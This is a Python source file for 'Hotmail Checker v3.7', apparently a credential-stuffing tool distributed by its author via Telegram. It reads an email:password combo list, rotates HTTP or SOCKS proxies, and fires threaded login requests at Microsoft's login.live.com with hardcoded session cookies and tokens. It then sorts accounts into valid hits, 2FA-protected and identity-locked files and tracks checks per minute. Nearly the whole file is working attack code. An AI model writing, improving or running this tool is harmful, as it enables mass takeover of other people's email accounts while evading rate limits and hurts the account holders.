# Write: Tool đã hoàn thành, chỉ cần thêm cấc hàm cho pc

import requests
import os
import sys
import wget
import time
import threading
import random
import ctypes
from datetime import datetime
from threading import Thread
from tkinter import filedialog
from time import strftime 

version = 3.7
os.system('title Hotmail Checker v3.7 | @mnhtools ')
def check_update():
    try:
        update = requests.get('https://raw.githubusercontent.com/lucius164/hotmailchecker/main/.version').text 
        print(update)
        if float(version) == float(update):
            pass
        else:
            user = input('The tool has a new version, do you want to update? (Y/n): ')
            if (user == 'y') or (user == 'Y'):
                link_update = requests.get('https://raw.githubusercontent.com/lucius164/hotmailchecker/main/.update').text 
                down_update = wget.download(link_update, 'Update.zip')
                print('\nUpdate finished')
                time.sleep(3)
                exit()
    except:
        exit('Connect timed out')
#check_update()

class Hotmail:
    def __init__(self):
        self.hits = 0 
        self.mfa = 0 
        self.identity = 0 
        self.bad = 0 
        self.retries = 0 
        self.error = 0
        self.total = 0
        self.total_combo = 0
        self.cpm = 0
        self.start = 0
        self.url = 'https://login.live.com/ppsecure/post.srf?nopa=1&username=shailendra3%40hotmail.com&client_id=00000000480F7C59&contextid=27CF2A4E0120C329&opid=E61DCCF28885C1A9&bk=1689655331&uaid=3c508047c5bd4d76b7bc826d82130bc1&pid=15216'
    def output(self, name, email, password, mode='a+'):
        now = datetime.now()
        days = now.strftime('%d')
        months = now.strftime('%m')
        years = now.strftime('%y')
        try:
            folder_path = f'Output/Results {days}-{months}-{years}/'
            os.makedirs(folder_path, exist_ok=True)
            file_path = os.path.join(folder_path, name)
            with open(file_path, mode) as save:
                save.write('%s:%s\n' % (email, password))
        except OSError as e:
            print(f"Error: {e}")
    def set_title(self, title):
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    def load_cpm(self):
        self.end = time.time()
        elapsed_time = self.end - self.start
        self.cpm = self.total / elapsed_time * 60 if elapsed_time > 0 else 0
        return round(self.cpm)
    def process(self):
        return str(round(self.total / self.total_combo * 100, 2)) + '%'
    def elapsed(self):
        return time.strftime('%H : %M : %S', time.gmtime(time.time() - self.start))
    def update_title(self):
        Hotmail().set_title('Administrator: Checked: %s/%s (%s) | Hits: %s | 2Fa: %s | Identity: %s | Bad: %s | Retries: %s | CPM: %s | Error: %s | Elapsed: %s' % (self.total, self.total_combo, str(self.process()), self.hits, self.mfa, self.identity, self.bad, self.retries, str(self.load_cpm()), self.error, str(self.elapsed())))
    def login(self, email, password):
        try:
            open_proxy = open(self.prx, 'r', encoding = 'utf-8').readlines()
            proxy = open_proxy[random.randint(0, len(open_proxy) - 1)].strip()
            if ':' not in proxy:
                    self.erro+=1
            elif len(proxy.split(':')) == 2:
                proxies = proxy.split(':')
                ip, port = proxies[0], proxies[1]
                self.proxies = {
                    'http': self.typeprx + '://' + f'{ip}:{port}',
                    'https': self.typeprx + '://' + f'{ip}:{port}',
                }
            elif len(proxy.split(':')) == 4:
                ip,port,user,pw = proxies[0],proxies[1],proxies[2],proxies[3]
                self.proxies = {
                    'http': self.typeprx + '://' + f'{user}:{pw}@{ip}:{port}',
                    'https': self.typeprx + '://' + f'{user}:{pw}@{ip}:{port}'
                }
        except:
            self.error +=1
        while True:
            try:
                self.headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "login.live.com",
                    "Cookie": "wlidperf=FR=L&ST=1689655353653; MicrosoftApplicationsTelemetryDeviceId=db825801-302a-4dbb-b591-1ac1ce97ba2e; MSPOK=$uuid-94b22710-e5f0-4735-a6c8-e77aebf9875f; MSPRequ=id=N&lt=1689655331&co=1; OParams=11O.DVpx1vdIi2VcZGzv*V8YMHKLRw5RiqoF5Gewurz2NyLhWiBDA1i2Hnw6*t9wOG8sPdMkNBIo380kv9jRvLE7zAaLUTogkYKcYrcLeztw3fLMKHdrfVGb1oaezqhiWkcASsQowsHU6lATV6ORMzu7XcDTbAkBfFdCYOLoGrpS!vGMQVBUlLhGwvmyQn8zcn9usjzWprsY0OciirT4kWHnF5899yIBJp1y2!oZL7AWoaKm3RSRS!ZAtKycNLZ1tanGmm0ZchCAsPToJ4JfFJsBFqJoIViROuDtYzIOg3SpwwoXuRRkgEEyR00uYbKt4F!jbaXK*GSR!Na!ZOzExnC6vsAtD*ftyVoEotDvN4nOdCwbRj1NVhFLABPxjQRoJPep3Q$$; uaid=3c508047c5bd4d76b7bc826d82130bc1",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Sec-Fetch-Site": "same-origin",
                    "Accept-Language": "vi-VN,vi;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Sec-Fetch-Mode": "navigate",
                    "Origin": "https://login.live.com",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
                    "Referer": f"Referer: https://login.live.com/oauth20_authorize.srf?client_id=00000000480F7C59&scope=service::onedrivemobile.live.com::MBI_SSL&response_type=token&locale=vi-VN&redirect_uri=https://login.live.com/oauth20_desktop.srf&lw=1&fl=easi1&nopa=1&noauthcancel=1&username={email}",
                    "Content-Length": "570",
                    "Sec-Fetch-Dest": "document",
                    "Connection": "close",
                }
                self.payload = f'i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=-DQY7JVkt7zdVgmN3AR5188cg4QWbY6rVc3GP9fVrNlF5*Sqk8jWJwoc9QUNSYhijohrxNyyDwriNSGadZyigExLjHyPfzUFVo4Ph3fpWUhCf*f2Ikf3ow5n*ViEs09tG1EVHbS27uywVph6dIhDIwTkRVEMvTHHkyMiWzK2ObRi8hAeSiT7gpyirOo%21JTux6Pg%24%24&PPSX=Passp&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=15393'
                send_requests = requests.post(self.url, headers = self.headers, data = self.payload, proxies = self.proxies, timeout = 5)
                self.update_title()
                self.total +=1
                if ('https://login.live.com/oauth20_desktop.srf' in send_requests.url) or ('action="https://account.live.com/profile/accrue?mkt' in send_requests.text ) or ('sSigninName' in send_requests.text) or ('account.live.com/tou/accrue' in send_requests.text) or ('access_token' in send_requests.url):
                    self.hits +=1
                    print('\033[0;32m[Hits] %s:%s' % (email, password))
                    Hotmail().output('Hits.txt', email, password)
                elif ('/cancel?mkt=' in send_requests.text) or ('/Abuse?mkt=' in send_requests.text) or ('Email/Confirm?mkt' in send_requests.text) or ('account.live.com/recover' in send_requests.text):
                    self.mfa +=1
                    print('\033[38;5;208m[2Fa] %s:%s' % (email, password))
                    Hotmail().output('2Fa.txt', email, password)
                elif ('account.live.com/identity/confirm?mkt' in send_requests.text) or ('account.live.com/proofs/Verify?mkt' in send_requests.text):
                    self.identity +=1
                    print('\033[38;5;208m[Identity] %s:%s' % (email, password))
                    Hotmail().output('Identity.txt', email, password)
                elif ('Tài khoản Microsoft không tồn tại.' in send_requests.text)or ('Tài khoản hoặc mật khẩu của bạn không chính xác.' in send_requests.text):
                    self.bad +=1
                else:
                    self.bad +=1
                break
            except Exception as e:
                self.retries +=1
                continue
    def load_combo(self):
        while True:
            try:
                self.combo = filedialog.askopenfilename(title="Select File Combo", filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
                self.total_combo = sum(1 for line in open(self.combo, 'r', encoding='utf-8'))
                print(f'\033[1;31m[\033[1;32m+\033[1;31m]\033[0m Loaded Combo: \033[1;32m{self.total_combo}')
                break
            except FileNotFoundError:
                print('\033[1;31mFile Not Found.')
                continue
    def load_proxies(self):
        while True:
            self.prx = filedialog.askopenfilename(title="Select File Proxies", filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
            if self.prx:
                self.total_prx = sum(1 for line in open(self.prx, 'r', encoding='utf-8'))   
                print(f'\033[1;31m[\033[1;32m+\033[1;31m]\033[0m Loaded Proxies: \033[1;32m{self.total_prx}')
                print('''
\033[0m1.\033[1;32m Http/s 
\033[0m2.\033[1;32m Socks4 
\033[0m3.\033[1;32m Socks5
            ''') 
                try:
                    prx_choice = int(input('\033[1;37m==>\033[1;32m '))
                    if prx_choice == 1:
                        self.typeprx = 'http'
                    elif prx_choice == 2:
                        self.typeprx = 'socks4'
                    elif prx_choice == 3:
                        self.typeprx = 'socks5'
                    else:
                        print('\033[1;31mPlease enter number 1, 2 or 3')
                        time.sleep(2)
                        exit() 
                except ValueError:
                    print('\033[1;31mPlease enter number 1, 2 or 3')
                    time.sleep(2)
                    exit()
                break
            else:
                print('\033[1;31mFile Not Found.')
                continue
    def clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    def main(self):
        print('''\033[1;36m
   __ __     __             _ __      __           __          
  / // /__  / /___ _  ___ _(_) / ____/ /  ___ ____/ /_____ ____
 / _  / _ \/ __/  ' \/ _ `/ / / / __/ _ \/ -_) __/  '_/ -_) __/
/_//_/\___/\__/_/_/_/\_,_/_/_/  \__/_//_/\__/\__/_/\_\\__/_/   
                                                                Owner: Mai Ngoc Hao 
                                                                Telegram: @lucius_164
            \033[0m''')
        print('\033[0;32mPress any Key to load Combo & Proxies ')
        self.load_combo()
        self.load_cpm()
        self.load_proxies()
        try:
            self.thread = int(input('\033[1;37mThread:\033[1;32m '))
        except ValueError:
            print('\033[1;31mThreads are invalid')
            time.sleep(2)
            exit()
        self.clear()
        self.start = time.time()
        print('''\033[1;36m
   __ __     __             _ __      __           __          
  / // /__  / /___ _  ___ _(_) / ____/ /  ___ ____/ /_____ ____
 / _  / _ \/ __/  ' \/ _ `/ / / / __/ _ \/ -_) __/  '_/ -_) __/
/_//_/\___/\__/_/_/_/\_,_/_/_/  \__/_//_/\__/\__/_/\_\\__/_/   
                                                                Owner: Mai Ngoc Hao 
                                                                Telegram: @lucius_164
        \033[0m''')
        with open(self.combo, 'r', encoding='utf-8') as file:
            threads = []
            for line in file.readlines():
                data = line.strip()
                if ':' not in data:
                    self.error +=1 
                    email = None 
                    password = None
                else:
                    account = data.split(':')
                    email = account[0]
                    password = account[1]
                thread = threading.Thread(target=self.login, args=(email, password))
                threads.append(thread)
                thread.start()
                if len(threads) >= self.thread:
                    for thread in threads:
                        thread.join()
                    threads = []
            for thread in threads:
                thread.join()
if __name__ == '__main__':
    Hotmail().main()
